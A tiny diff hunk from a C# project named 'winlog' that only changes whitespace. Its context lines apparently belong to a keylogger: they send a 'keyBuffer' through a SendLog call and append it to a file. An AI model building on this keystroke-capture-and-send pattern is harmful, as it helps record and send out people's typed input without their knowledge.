@@ -369,8 +369,7 @@ namespace winlog
                 retval = m.SendLog(keyBuffer);
 
                 if (retval != "SUCCESS")
-                    Print(retval);
-               
+                    Print(retval);               
 
                 FileStream fil = new FileStream(file, FileMode.Append, FileAccess.Write);
                 using (StreamWriter sw = new StreamWriter(fil))
